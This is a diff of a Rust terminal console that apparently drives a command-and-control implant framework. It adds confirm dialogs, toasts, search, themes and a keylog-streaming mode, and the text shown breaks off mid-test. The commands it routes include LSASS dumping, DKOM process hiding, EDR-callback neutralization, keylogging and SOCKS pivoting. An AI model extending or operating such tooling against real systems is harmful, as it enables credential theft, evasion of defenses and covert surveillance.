@@ -45,15 +45,16 @@ mod render;
 mod session_meta;
 mod topology;
 use input::{
-    apply_scroll, filter_meta, move_popup_selection, parse_sleep_args, popup_submit_target, Input,
-    PopupMove, ScrollDir, SleepSpec, META_COMMANDS,
+    apply_scroll, destructive_confirm, filter_meta, move_popup_selection, parse_sleep_args,
+    popup_submit_target, Input, PopupMove, ScrollDir, SleepSpec, META_COMMANDS,
 };
 use render::render;
 
-/// Max lines kept in the event stream (older dropped).
-const STREAM_CAP: usize = 5000;
+/// 默认事件流上限（older dropped）。运行时可用 `/config stream_cap <N>` 改，
+/// 实际值存在 `App::stream_cap`。
+const DEFAULT_STREAM_CAP: usize = 5000;
 
-/// Max entries kept in command history (older dropped). 与 STREAM_CAP 对称，
+/// Max entries kept in command history (older dropped). 与 stream_cap 对称，
 /// 防止长时间运行（尤其自动化脚本通过 TUI 发大量命令）导致 history 无界增长。
 const HISTORY_CAP: usize = 2000;
 
@@ -89,6 +90,55 @@ pub(super) enum Overlay {
 impl Overlay {
     fn is_open(&self) -> bool {
         !matches!(self, Overlay::None)
+    }
+}
+
+/// Pending destructive action awaiting y/N confirmation.
+///
+/// Set when the operator submits `/kill`, `/rm`, `/hide`, `/neutralize`, or
+/// `/dump-lsass` — instead of dispatching immediately we pop a centered
+/// confirm overlay (`render_confirm_overlay`) and only re-dispatch the stored
+/// command once the operator presses `y`.
+pub(super) struct ConfirmAction {
+    /// The full typed line to re-dispatch if confirmed (e.g. `/rm C:\\x`,
+    /// `/hide 1234`). Re-dispatch reuses the normal `submit` path, with
+    /// `App::confirmed` set so the intercept doesn't re-prompt.
+    cmd: String,
+    /// Human-readable headline shown in the overlay body
+    /// (e.g. "Delete file C:\\x on the target?").
+    description: String,
+}
+
+/// Transient toast notification — appears bottom-right, auto-dismisses after
+/// a level-appropriate timeout. Unlike event-stream log lines (which persist
+/// for audit), toasts are eye-level, ephemeral feedback: connection result,
+/// command errors, destructive-action cancellation, etc. Capped at 5 visible
+/// at once (oldest dropped) to prevent flooding the corner.
+pub(super) struct Toast {
+    pub text: String,
+    pub level: Level,
+    pub created: Instant,
+    pub duration: Duration,
+}
+
+impl Toast {
+    /// Build a toast with a default duration: 3s for Info/Ok, 5s for Warn/Err
+    /// (errors deserve more reading time).
+    fn new(text: impl Into<String>, level: Level) -> Self {
+        let duration = match level {
+            Level::Err | Level::Warn => Duration::from_secs(5),
+            _ => Duration::from_secs(3),
+        };
+        Self {
+            text: text.into(),
+            level,
+            created: Instant::now(),
+            duration,
+        }
+    }
+
+    fn is_expired(&self) -> bool {
+        self.created.elapsed() >= self.duration
     }
 }
 
@@ -151,13 +201,37 @@ pub(super) struct App {
     pub(super) focused_pane_rect: Rect,
     /// Sessions overlay 里每行的屏幕 hit region（render 每帧重建）。
     /// click 精确命中查询用——避免 List widget 滚动偏移导致算术推算失效。
-    pub(super) session_row_rects: Vec<Rect>,
+    /// 元组第二项 = 该行对应的全局 session 索引（overlay 滚动后可见行不再从 0 起）。
+    pub(super) session_row_rects: Vec<(Rect, usize)>,
     /// 每个窗格 SessionList 视图的行 hit regions（per-pane）。render 每帧重建。
     /// 键 = 窗格 id；值 = 该窗格 session 列表每行的 (Rect, session_id)。
     /// click 点中某行 → 把该窗格的 session 切到对应 beacon。
     pub(super) pane_session_rows: HashMap<usize, Vec<(Rect, String)>>,
     /// 鼠标当前悬停的窗格 id（用于 hover 高亮）。None = 未悬停窗格区域。
     pub(super) hover_pane: Option<usize>,
+    /// 待确认的破坏性命令（非 None 时渲染 confirm overlay，仅响应 y/n/Esc）。
+    /// 详见 [`ConfirmAction`]。
+    pub(super) confirm_action: Option<ConfirmAction>,
+    /// overlay 的滚动偏移（0 = 顶部）。overlay 打开或切换时复位为 0。
+    /// PgUp/PgDn/↑/↓ 在 overlay 打开时调整它（取代 pane 滚动）。
+    pub(super) overlay_scroll: usize,
+    /// 事件流搜索过滤。Some(q) = 只显示含 q 的行（大小写不敏感）。
+    /// 底层 `stream: Vec<LogLine>` 不受影响（仍持有全部行），仅 display 层过滤。
+    /// Ctrl+F 进入搜索输入态，Esc 退出并清空。
+    pub(super) search_query: Option<String>,
+    /// 搜索模式下的实时输入缓冲。Some(_) = 正在敲搜索词（按键直接进这里，
+    /// 不进 pane 输入框）。Enter 落到 `search_query`，Esc 清空两者。
+    pub(super) search_input: Option<String>,
+    /// 事件流上限（运行时可调：`/config stream_cap <N>`）。默认 [`DEFAULT_STREAM_CAP`]。
+    /// 改小后立即裁剪现有 stream。
+    pub(super) stream_cap: usize,
+    /// Monotonically-increasing render frame counter — drives spinner animation.
+    /// 每帧 +1，渲染侧用 `spinner_char(tick)` 取模选 braille 帧字符。
+    pub(super) tick: u64,
+    /// Active toast notifications — newest appended, oldest at front. Capped at
+    /// 5 (older dropped) so a burst of feedback doesn't flood the corner. Each
+    /// carries its own expiry; [`poll_worker`] sweeps expired ones per frame.
+    pub(super) toasts: Vec<Toast>,
 }
 
 impl App {
@@ -190,6 +264,13 @@ impl App {
             session_row_rects: Vec::new(),
             pane_session_rows: HashMap::new(),
             hover_pane: None,
+            confirm_action: None,
+            overlay_scroll: 0,
+            search_query: None,
+            search_input: None,
+            stream_cap: DEFAULT_STREAM_CAP,
+            tick: 0,
+            toasts: Vec::new(),
         }
     }
 
@@ -243,6 +324,13 @@ impl App {
         }
     }
 
+    /// 所有 session 的 pending 任务总数。>0 表示有命令在飞——状态栏据此显示
+    /// spinner，空窗格据此显示 "fetching…"。聚合所有 beacon 而非仅焦点 session：
+    /// 多分屏下一个窗格跑命令时全局指示器也该转。
+    pub(super) fn pending_total(&self) -> usize {
+        self.sessions.iter().map(|s| s.pending).sum()
+    }
+
     fn log(&mut self, text: &str, level: Level) {
         let sid = self.current_session().map(|s| s.id.clone());
         for line in text.lines() {
@@ -252,14 +340,34 @@ impl App {
                 session_id: sid.clone(),
             });
         }
-        if self.stream.len() > STREAM_CAP {
-            let drop = self.stream.len() - STREAM_CAP;
+        self.trim_stream();
+    }
+
+    /// Push a transient toast notification (bottom-right, auto-dismisses).
+    /// Capped at 5 — when exceeded the oldest is dropped. Call this alongside
+    /// [`log`] for high-visibility feedback (connection result, command errors,
+    /// destructive-action cancellation), or alone for purely transient messages.
+    fn toast(&mut self, text: impl Into<String>, level: Level) {
+        self.toasts.push(Toast::new(text, level));
+        if self.toasts.len() > 5 {
+            self.toasts.remove(0);
+        }
+    }
+
+    /// 把 stream 裁剪到 `stream_cap` 以内。新增日志 / worker 快照 / 改 cap 后都调它。
+    fn trim_stream(&mut self) {
+        if self.stream.len() > self.stream_cap {
+            let drop = self.stream.len() - self.stream_cap;
             self.stream.drain(..drop);
         }
     }
 
     /// Drain snapshots from the worker (non-blocking).
     fn poll_worker(&mut self) {
+        // Expire old toasts once per frame. This runs every loop iteration
+        // (~33ms tick) regardless of whether a snapshot arrived, so toasts
+        // fade out on time even when the worker is idle.
+        self.toasts.retain(|t| !t.is_expired());
         while let Ok(snap) = self.bridge.snapshots.try_recv() {
             self.connected = snap.connected;
             if !snap.sessions.is_empty() {
@@ -286,10 +394,7 @@ impl App {
             for l in snap.log_lines {
                 self.stream.push(l);
             }
-            if self.stream.len() > STREAM_CAP {
-                let drop = self.stream.len() - STREAM_CAP;
-                self.stream.drain(..drop);
-            }
+            self.trim_stream();
             // A parsed table arrived → pop it as the fullscreen overlay AND mirror
             // it into the per-view cache so the in-pane renderers (Ctrl+3/4/5)
             // show real data instead of placeholders. The overlay is dismissible
@@ -402,6 +507,8 @@ impl App {
                         }
                     }
                 };
+                // overlay 切换/重开 → 滚动复位到顶部。
+                self.overlay_scroll = 0;
             }
         }
     }
@@ -411,10 +518,33 @@ impl App {
     fn send(&mut self, cmd: Cmd) {
         if self.bridge.cmds.send(cmd).is_err() {
             self.log("! worker channel closed — command dropped", Level::Err);
+            self.toast("! worker channel closed — command dropped", Level::Err);
         }
     }
 
     fn handle_key(&mut self, key: KeyEvent) {
+        // Confirm overlay takes priority over EVERYTHING (overlay, prefix,
+        // input typing). When active only y/n/Esc are meaningful; any other
+        // key is swallowed so the operator must explicitly confirm or deny.
+        if self.confirm_action.is_some() {
+            // Ctrl+C 仍能紧急退出（即便在确认中），保持"Ctrl+C 永远退出"约定。
+            if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('c') {
+                self.should_quit = true;
+                return;
+            }
+            self.handle_confirm_key(key);
+            return;
+        }
+        // 搜索输入态：按键直接进 search_input，不进 pane 输入框。
+        // Ctrl+C 仍能退出（保持全局约定）。Esc 清空并退出，Enter 落到 search_query。
+        if self.search_input.is_some() {
+            if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('c') {
+                self.should_quit = true;
+                return;
+            }
+            self.handle_search_key(key);
+            return;
+        }
         // Overlay takes priority when open (q/Esc/jk/Enter to pick sessions).
         if self.overlay.is_open() {
             self.handle_overlay_key(key);
@@ -477,6 +607,13 @@ impl App {
                 KeyCode::Char('b') => {
                     self.tmux_prefix = true;
                     self.prefix_since = Some(Instant::now());
+                    return;
+                }
+                KeyCode::Char('f') => {
+                    // 进入事件流搜索模式：search_input 拿到现有 search_query 作为
+                    // 初始值（可继续编辑），stream 的 display 层实时过滤。
+                    let prev = self.search_query.clone().unwrap_or_default();
+                    self.search_input = Some(prev);
                     return;
                 }
                 _ => {}
@@ -785,6 +922,9 @@ impl App {
     }
 
     fn handle_overlay_key(&mut self, key: KeyEvent) {
+        // overlay 滚动页大小：取 overlay 可视高度的合理估值（与 render 的 inner
+        // 高度一致：focused_pane_rect 去掉边框 2 + block padding）。最少 1。
+        let page = self.focused_pane_rect.height.saturating_sub(4).max(1) as usize;
         match &mut self.overlay {
             Overlay::Sessions(state) => match key.code {
                 KeyCode::Char('j') | KeyCode::Down => {
@@ -797,6 +937,10 @@ impl App {
                     let i = state.selected().unwrap_or(0);
                     state.select(Some(i.saturating_sub(1)));
                 }
+                // PgUp/PgDn 滚动 Sessions 列表（↑/↓ 保留给选区导航）。
+                // overlay_scroll 顶部锚定（0=顶）：PgUp 向顶（减），PgDn 向底（加）。
+                KeyCode::PageUp => self.overlay_scroll = self.overlay_scroll.saturating_sub(page),
+                KeyCode::PageDown => self.overlay_scroll = self.overlay_scroll.saturating_add(page),
                 KeyCode::Enter => {
                     if let Some(i) = state.selected() {
                         if let Some(s) = self.sessions.get(i) {
@@ -814,9 +958,58 @@ impl App {
             },
             Overlay::None => {}
             _ => match key.code {
+                // 表格 overlay（Files/Procs/Creds/Audit/Tasks…）：↑/↓/PgUp/PgDn 滚动。
+                // overlay_scroll 顶部锚定（0=顶）：↑/PgUp 向顶（减），↓/PgDn 向底（加）。
+                // overlay_scroll 可超 max_scroll，render 会 clamp；上滚 saturating 到 0。
+                KeyCode::PageUp | KeyCode::Up => {
+                    self.overlay_scroll = self
+                        .overlay_scroll
+                        .saturating_sub(if key.code == KeyCode::PageUp { page } else { 1 });
+                }
+                KeyCode::PageDown | KeyCode::Down => {
+                    self.overlay_scroll =
+                        self.overlay_scroll
+                            .saturating_add(if key.code == KeyCode::PageDown {
+                                page
+                            } else {
+                                1
+                            });
+                }
                 KeyCode::Char('q') | KeyCode::Esc => self.overlay = Overlay::None,
                 _ => {}
             },
+        }
+    }
+
+    /// 搜索输入态的按键处理。Esc/Enter 退出输入态（Enter 落到 search_query，
+    /// Esc 清空过滤）；其余字符追加到缓冲；Backspace 删尾。
+    fn handle_search_key(&mut self, key: KeyEvent) {
+        let input = match self.search_input.as_mut() {
+            Some(i) => i,
+            None => return,
+        };
+        match key.code {
+            KeyCode::Esc => {
+                // 退出搜索：清空过滤 + 输入缓冲，回到全量显示。
+                self.search_input = None;
+                self.search_query = None;
+            }
+            KeyCode::Enter => {
+                // 提交：落到 search_query（空串视为不过滤）。仍留在过滤态但退出
+                // 输入态——Esc 才彻底清空。
+                let q = std::mem::take(input);
+                self.search_input = None;
+                self.search_query = if q.trim().is_empty() { None } else { Some(q) };
+            }
+            KeyCode::Backspace => {
+                input.pop();
+            }
+            KeyCode::Char(c) if !key.modifiers.contains(KeyModifiers::CONTROL) => {
+                // Ctrl 组合键已在 handle_key 顶部拦截（仅 Ctrl+C 退出），这里只收
+                // 裸字符。
+                input.push(c);
+            }
+            _ => {}
         }
     }
 
@@ -827,6 +1020,11 @@ impl App {
     /// - 中键单击：分屏（左右切分所点窗格，快速开新工作区）
     /// - 鼠标移动：更新 hover_pane 供 render 高亮（视觉反馈）
     fn handle_mouse(&mut self, ev: MouseEvent) {
+        // 确认 overlay 开着时吞掉所有鼠标事件：模态对话框期间不允许点背后
+        // 的窗格（避免误操作 / 焦点漂移）。操作员必须用键盘 y/n/Esc 回应。
+        if self.confirm_action.is_some() {
+            return;
+        }
         // 先更新 hover：鼠标在哪格上方。render 用它做 hover 高亮。
         if let Some(id) = self.pane_at(ev.row, ev.column) {
             self.hover_pane = Some(id);
@@ -930,11 +1128,12 @@ impl App {
         // Sessions overlay：用 session_row_rects 精确命中（render 记录的每行 Rect）。
         // 不再用算术推算——List widget 滚动偏移会让 row→idx 映射失效。
         if let Overlay::Sessions(state) = &mut self.overlay {
-            // 用上一帧 render 记录的 hit regions 查命中。
-            for (i, r) in self.session_row_rects.iter().enumerate() {
+            // 用上一帧 render 记录的 hit regions 查命中。元组带全局 session 索引，
+            // 所以即便 overlay 滚动了，点击仍能映射到正确的 session。
+            for (r, i) in self.session_row_rects.iter() {
                 if row >= r.y && row < r.y + r.height && col >= r.x && col < r.x + r.width {
-                    state.select(Some(i));
-                    if let Some(s) = self.sessions.get(i) {
+                    state.select(Some(*i));
+                    if let Some(s) = self.sessions.get(*i) {
                         self.pane_tree
                             .set_session_id(self.focused_pane, Some(s.id.clone()));
                         self.log(&format!("selected beacon {}", short(&s.id)), Level::Ok);
@@ -1057,10 +1256,105 @@ impl App {
                 self.history.drain(..drop);
             }
         }
-        match input::classify_with(&raw, &self.config.aliases) {
+        // 破坏性命令确认拦截：/kill /rm /hide /neutralize /dump-lsass。
+        // 拦截只发生在操作员新输入时；确认后走 dispatch_confirmed 直接派发，
+        // 不再回到 submit，所以无需 bypass flag。
+        if self.confirm_action.is_none() {
+            if let Some(desc) = destructive_confirm(&raw) {
+                self.confirm_action = Some(ConfirmAction {
+                    cmd: raw.clone(),
+                    description: self.build_confirm_description(&raw, desc),
+                });
+                return; // 等待 y/N，不派发
+            }
+        }
+        self.dispatch_line(&raw);
+    }
+
+    /// Classify + dispatch a typed line, with no confirmation gating.
+    ///
+    /// Shared by [`submit`] (normal input) and the confirm-overlay `y` handler
+    /// (re-dispatch of the stored destructive command). Keeping it separate
+    /// means confirmation re-dispatch doesn't re-push history or re-trigger
+    /// the intercept — the stored `cmd` already lives in history from the
+    /// original `submit`.
+    fn dispatch_line(&mut self, raw: &str) {
+        match input::classify_with(raw, &self.config.aliases) {
             Input::Empty => {}
             Input::Shell(cmd) => self.run_shell(&cmd),
             Input::Meta { name, args } => self.run_meta(&name, &args),
+        }
+    }
+
+    /// Confirm-overlay key handling. Returns true if the key was consumed
+    /// (so the caller can short-circuit before any other key routing).
+    ///
+    /// `y` → re-dispatch the stored command via [`dispatch_line`] (bypasses
+    ///   the intercept and history, since it's already there from the first
+    ///   submit); `n`/`Esc` → cancel; anything else → ignored (must explicitly
+    ///   confirm or deny).
+    fn handle_confirm_key(&mut self, key: KeyEvent) -> bool {
+        let action = match self.confirm_action.take() {
+            Some(a) => a,
+            None => return false,
+        };
+        match key.code {
+            KeyCode::Char('y') => {
+                // 重派发存的原命令。不进 submit（避免重复 history + 再拦截）。
+                self.dispatch_line(&action.cmd);
+                self.confirm_action = None;
+                true
+            }
+            KeyCode::Char('n') | KeyCode::Esc => {
+                self.log("cancelled", Level::Info);
+                self.toast("cancelled", Level::Warn);
+                self.confirm_action = None;
+                true
+            }
+            _ => {
+                // 未确认也未取消：把 action 放回去，继续等。
+                self.confirm_action = Some(action);
+                true // 仍吞掉该键（必须显式 y/n/Esc）
+            }
+        }
+    }
+
+    /// 构造破坏性命令的确认提示语。`generic` 是来自 [`DESTRUCTIVE_COMMANDS`]
+    /// 的通用描述；这里按命令补充上下文（beacon id / 目标路径 / pid），让
+    /// 操作员在 y 之前看到具体影响对象。
+    ///
+    /// 退化情况（无选中 beacon、解析失败）只回退到 generic 文案，不阻断确认流程。
+    fn build_confirm_description(&self, raw: &str, generic: &str) -> String {
+        let trimmed = raw.trim();
+        let (cmd, rest) = match trimmed.split_once(char::is_whitespace) {
+            Some((c, r)) => (c.to_ascii_lowercase(), r.trim()),
+            None => (trimmed.to_ascii_lowercase(), ""),
+        };
+        match cmd.as_str() {
+            "/kill" => {
+                let sid = self
+                    .current_session()
+                    .map(|s| short(&s.id))
+                    .unwrap_or_default();
+                format!("Kill beacon session {sid}? The implant will exit.")
+            }
+            "/rm" => {
+                let path = rest.split_whitespace().next().unwrap_or("<path>");
+                format!("Delete file {path} on the target? {generic}")
+            }
+            "/hide" => {
+                let pid = rest.split_whitespace().next().unwrap_or("<pid>");
+                format!("Hide process {pid} via kernel DKOM? {generic}")
+            }
+            "/neutralize" => {
+                let pid = rest.split_whitespace().next().unwrap_or("<pid>");
+                format!("Neutralize EDR callbacks for {pid}? {generic}")
+            }
+            "/dump-lsass" => {
+                let pid = rest.split_whitespace().next().unwrap_or("<pid>");
+                format!("Dump LSASS memory for pid {pid}? {generic}")
+            }
+            _ => generic.to_string(),
         }
     }
 
@@ -1070,6 +1364,7 @@ impl App {
                 "! no beacon selected — use /use <id> or /sessions",
                 Level::Err,
             );
+            self.toast("! no beacon selected", Level::Err);
             return;
         };
         self.log(&format!("[{}] $ {}", short(&s.id), cmd), Level::Info);
@@ -1091,16 +1386,58 @@ impl App {
                 }
             }
             "/clear" => self.stream.clear(),
+            "/config" => {
+                // /config                     — 显示当前可调运行时参数
+                // /config stream_cap <N>      — 改事件流上限，改小立即裁剪
+                let mut parts = args.split_whitespace();
+                match parts.next() {
+                    Some("stream_cap") => {
+                        let n = match parts.next().and_then(|x| x.parse::<usize>().ok()) {
+                            Some(v) => v,
+                            None => {
+                                self.log("usage: /config stream_cap <N>", Level::Warn);
+                                return;
+                            }
+                        };
+                        if n == 0 {
+                            self.log("! stream_cap must be > 0", Level::Warn);
+                            return;
+                        }
+                        let old = self.stream_cap;
+                        self.stream_cap = n;
+                        self.trim_stream();
+                        self.log(
+                            &format!("stream_cap: {old} → {n} (stream now {})", self.stream.len()),
+                            Level::Ok,
+                        );
+                    }
+                    Some(other) => self.log(
+                        &format!("! /config: unknown key '{other}' (stream_cap)"),
+                        Level::Err,
+                    ),
+                    None => self.log(
+                        &format!(
+                            "config: stream_cap={} (stream={}/{})",
+                            self.stream_cap,
+                            self.stream.len(),
+                            self.stream_cap
+                        ),
+                        Level::Info,
+                    ),
+                }
+            }
             "/theme" => {
-                // /theme             — 显示当前主题
-                // /theme mocha       — Catppuccin Mocha（默认）
-                // /theme highcontrast — WCAG AAA 高对比度
-                // /theme nocolor     — 无色（遵守 NO_COLOR）
+                // /theme               — 显示当前主题
+                // /theme mocha         — Catppuccin Mocha（默认）
+                // /theme frappe        — Catppuccin Frappé（medium-dark）
+                // /theme macchiato     — Catppuccin Macchiato
+                // /theme highcontrast  — WCAG AAA 高对比度
+                // /theme nocolor       — 无色（遵守 NO_COLOR）
                 let sub = args.trim();
                 if sub.is_empty() {
                     self.log(
                         &format!(
-                            "current theme: {} (options: mocha, highcontrast, nocolor)",
+                            "current theme: {} (options: mocha, frappe, macchiato, highcontrast, nocolor)",
                             self.config.theme
                         ),
                         Level::Info,
@@ -1108,11 +1445,11 @@ impl App {
                 } else {
                     let valid = matches!(
                         sub.to_ascii_lowercase().as_str(),
-                        "mocha" | "highcontrast" | "hc" | "nocolor"
+                        "mocha" | "frappe" | "macchiato" | "highcontrast" | "hc" | "nocolor"
                     );
                     if !valid {
                         self.log(
-                            &format!("! unknown theme '{sub}' (mocha | highcontrast | nocolor)"),
+                            &format!("! unknown theme '{sub}' (mocha | frappe | macchiato | highcontrast | nocolor)"),
                             Level::Warn,
                         );
                         return;
@@ -1231,7 +1568,8 @@ impl App {
                         let node_strs: Vec<String> = layer_nodes
                             .iter()
                             .map(|n| {
-                                let mark = if n.is_beacon { "◆" } else { "◇" };
+                                // ●/○ 与连接状态点统一（render_statusbar），填充=活跃。
+                                let mark = if n.is_beacon { "●" } else { "○" };
                                 let star = if self.sessions_meta.get(&n.id).favorite {
                                     " ★"
                                 } else {
@@ -1296,6 +1634,7 @@ impl App {
                             .collect();
                         self.log(&format!("{} match(es)", rows.len()), Level::Ok);
                         self.overlay = Overlay::Creds(rows);
+                        self.overlay_scroll = 0;
                     }
                 } else if sub == "list" || sub.is_empty() {
                     if self.creds.entries.is_empty() {
@@ -1316,6 +1655,7 @@ impl App {
                             })
                             .collect();
                         self.overlay = Overlay::Creds(rows);
+                        self.overlay_scroll = 0;
                     }
                 } else if sub.starts_with("add ") {
                     let mut parts = sub.split_whitespace().skip(1);
@@ -1425,6 +1765,7 @@ impl App {
                 };
                 let token = parts.next().map(|s| s.to_string());
                 self.log(&format!("connecting to {url} …",), Level::Info);
+                self.toast(format!("connecting to {url} …"), Level::Info);
                 self.send(Cmd::Connect(url, token));
             }
             "/sessions" => {
@@ -1462,6 +1803,7 @@ impl App {
                                 .or(filtered.first().copied()),
                         );
                         self.overlay = Overlay::Sessions(st);
+                        self.overlay_scroll = 0;
                     }
                 }
             }
@@ -1470,7 +1812,10 @@ impl App {
                 // 列表/状态栏放不下的字段（pid/pending/age/ja3/ja4 + 本地 meta）
                 // 一次性展示。本地数据 overlay，无 worker round-trip。
                 match self.current_session() {
-                    Some(s) => self.overlay = Overlay::SessionDetail(s.id.clone()),
+                    Some(s) => {
+                        self.overlay = Overlay::SessionDetail(s.id.clone());
+                        self.overlay_scroll = 0;
+                    }
                     None => self.log("! no beacon selected", Level::Warn),
                 }
             }
@@ -1512,6 +1857,7 @@ impl App {
             "/bof" => {
                 let Some(s) = self.current_session().cloned() else {
                     self.log("! select a beacon first", Level::Err);
+                    self.toast("! select a beacon first", Level::Err);
                     return;
                 };
                 let mut parts = args.split_whitespace();
@@ -1707,7 +2053,10 @@ impl App {
                     return;
                 };
                 let ch: u8 = args.trim().parse().unwrap_or(0);
-                self.send(Cmd::SetChannel { session: s.id, channel: ch });
+                self.send(Cmd::SetChannel {
+                    session: s.id,
+                    channel: ch,
+                });
             }
             "/clipboard" => {
                 let Some(s) = self.current_session().cloned() else {
@@ -1731,12 +2080,37 @@ impl App {
                     self.log("! select a beacon first", Level::Err);
                     return;
                 };
-                let action = match args.trim() {
+                // `/keylog stream [secs]` — continuous dump (re-enqueues every
+                // N seconds, default 5, minimum 2). `unstream` stops the loop.
+                let trimmed = args.trim();
+                if trimmed == "stream" || trimmed.starts_with("stream ") {
+                    let secs: u32 = trimmed
+                        .split_whitespace()
+                        .nth(1)
+                        .and_then(|x| x.parse().ok())
+                        .unwrap_or(5);
+                    self.send(Cmd::KeylogStreamStart {
+                        session: s.id.clone(),
+                        interval_secs: secs,
+                    });
+                    let msg = format!("[{}] keylog stream every {secs}s", short(&s.id));
+                    self.log(&msg, Level::Info);
+                    self.toast(msg, Level::Ok);
+                    return;
+                }
+                if trimmed == "unstream" || trimmed == "stop-stream" {
+                    self.send(Cmd::KeylogStreamStop { session: s.id });
+                    return;
+                }
+                let action = match trimmed {
                     "start" => 0,
                     "stop" => 1,
                     "dump" | "" => 2,
                     _ => {
-                        self.log("usage: /keylog <start|stop|dump>", Level::Warn);
+                        self.log(
+                            "usage: /keylog <start|stop|dump|stream [secs]|unstream>",
+                            Level::Warn,
+                        );
                         return;
                     }
                 };
@@ -1944,31 +2318,71 @@ impl App {
                     return;
                 };
                 let mut it = args.split_whitespace();
-                let chan: u32 = match it.next().and_then(|x| x.parse().ok()) {
+                // Two forms:
+                //   /socks start [bind_addr]   — in-TUI SOCKS5 relay (default 127.0.0.1:1080)
+                //   /socks stop                — stop the in-TUI relay
+                //   /socks <chan> <op> <addr> <port> — manual channel control frame
+                // The first token disambiguates: "start"/"stop" are the relay
+                // subcommands; anything else is parsed as the legacy control form.
+                let first = it.next().unwrap_or("");
+                if first.eq_ignore_ascii_case("start") {
+                    let bind_addr = it.next().unwrap_or("127.0.0.1:1080").to_string();
+                    let msg = format!("socks listening on {bind_addr}");
+                    self.log(&msg, Level::Ok);
+                    self.toast(msg, Level::Ok);
+                    self.send(Cmd::SocksStart {
+                        session: s.id.clone(),
+                        bind_addr,
+                    });
+                    return;
+                }
+                if first.eq_ignore_ascii_case("stop") {
+                    self.log(
+                        &format!("[{}] socks relay stopped", short(&s.id)),
+                        Level::Info,
+                    );
+                    self.toast("socks relay stopped", Level::Warn);
+                    self.send(Cmd::SocksStop { session: s.id });
+                    return;
+                }
+                // Legacy manual channel control frame.
+                let chan: u32 = match first.parse().ok() {
                     Some(c) => c,
                     None => {
-                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
+                        self.log(
+                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
+                            Level::Warn,
+                        );
                         return;
                     }
                 };
                 let op: u8 = match it.next().and_then(|x| x.parse().ok()) {
                     Some(o) => o,
                     None => {
-                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
+                        self.log(
+                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
+                            Level::Warn,
+                        );
                         return;
                     }
                 };
                 let addr = match it.next() {
                     Some(a) => a.to_string(),
                     None => {
-                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
+                        self.log(
+                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
+                            Level::Warn,
+                        );
                         return;
                     }
                 };
                 let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
                     Some(p) => p,
                     None => {
-                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
+                        self.log(
+                            "usage: /socks start [addr] | /socks stop | /socks <chan> <op> <addr> <port>",
+                            Level::Warn,
+                        );
                         return;
                     }
                 };
@@ -2037,6 +2451,7 @@ impl App {
     fn run_parsed_shell(&mut self, args: &str, label: &str, which: ShellFor) {
         let Some(s) = self.current_session().cloned() else {
             self.log("! select a beacon first", Level::Err);
+            self.toast("! select a beacon first", Level::Err);
             return;
         };
         let is_windows = s.os.to_ascii_lowercase().contains("windows");
@@ -2308,6 +2723,9 @@ fn main_loop(
             app.prefix_since = None;
         }
         terminal.draw(|f| render(app, f))?;
+        // 帧计数 +1：驱动 braille spinner 动画（pending 任务 / 断线重连指示）。
+        // 放在 draw 后保证 spinner_char(app.tick) 取到的是本帧渲染用的值。
+        app.tick = app.tick.wrapping_add(1);
         // poll input at ~33ms cadence（P1-3）。之前 100ms 导致 worker 快照最多
         // 延迟 ~200ms 才渲染（人眼可感卡顿）。降到 33ms（~30fps 上限）后端到端
         // 延迟 <70ms，CPU 成本可忽略（poll 空转极廉价）。
@@ -2713,9 +3131,9 @@ mod tests {
             "应记录至少 2 行 hit region"
         );
         // 点击第 2 行（hostB）的中间位置。
-        let row2 = app.session_row_rects[1];
-        let click_col = row2.x + 5;
-        let click_row = row2.y;
+        let (row2_rect, _) = app.session_row_rects[1];
+        let click_col = row2_rect.x + 5;
+        let click_row = row2_rect.y;
         app.handle_mouse(MouseEvent {
             kind: MouseEventKind::Down(MouseButton::Left),
             column: click_col,
@@ -3293,5 +3711,586 @@ mod tests {
             "focused_pane_rect 应是窗格大小非全屏，got width={}",
             app.focused_pane_rect.width
         );
+    }
+
+    /// 确认 overlay 渲染不崩，且 buffer 含描述 + y/n 提示。
+    #[test]
+    fn render_confirm_overlay_shows_description_and_hints() {
+        let mut app = fake_app();
+        app.confirm_action = Some(ConfirmAction {
+            cmd: "/kill".into(),
+            description: "Kill beacon session deadbeef? The implant will exit.".into(),
+        });
+        // 宽终端让描述不换行（避免 wrap 把子串拆到不同行导致线性扫描失败）。
+        let mut term = Terminal::new(TestBackend::new(120, 30)).unwrap();
+        term.draw(|f| render(&mut app, f)).unwrap();
+        let buf_str: String = term
+            .backend()
+            .buffer()
+            .content()
+            .iter()
+            .map(|c| c.symbol())
+            .collect();
+        assert!(buf_str.contains("Confirm"), "overlay 应有 Confirm 标题");
+        assert!(buf_str.contains("Kill beacon"), "overlay 应显示描述前半");
+        assert!(buf_str.contains('y'), "overlay 应提示 y 键");
+        assert!(buf_str.contains('n'), "overlay 应提示 n 键");
+    }
+
+    /// 破坏性命令提交后不立即派发，而是进入 confirm 状态。
+    /// 校验：submit("/kill") 后 confirm_action = Some，且 worker 未收到 Cmd。
+    #[test]
+    fn destructive_command_enters_confirm_not_dispatch() {
+        let (snap_tx, snap_rx) = std::sync::mpsc::channel();
+        let (cmd_tx, cmd_rx) = std::sync::mpsc::channel();
+        let mut app = App::new(Bridge {
+            snapshots: snap_rx,
+            cmds: cmd_tx,
+        });
+        // 给一个 session 让 /kill 看起来有意义（不强制，但贴近真实路径）。
+        app.sessions = vec![SessionView {
+            id: "deadbeef".into(),
+            ..fake_session()
+        }];
+        app.pane_tree
+            .set_session_id(app.focused_pane, Some("deadbeef".into()));
+
+        // 模拟键入 /kill + Enter
+        {
+            let st = app.focused_state_mut();
+            st.input = "/kill".into();
+            st.cursor = st.input.len();
+        }
+        app.submit();
+
+        // 应进入确认态，未派发
+        assert!(app.confirm_action.is_some(), "/kill 应触发 confirm overlay");
+        assert!(
+            cmd_rx.try_recv().is_err(),
+            "worker 不应在确认前收到任何 Cmd"
+        );
+        let _ = snap_tx; // keep alive
+    }
+
+    /// 确认态下按 y → 派发原命令；按 n → 取消不派发。
+    #[test]
+    fn confirm_y_dispatches_n_cancels() {
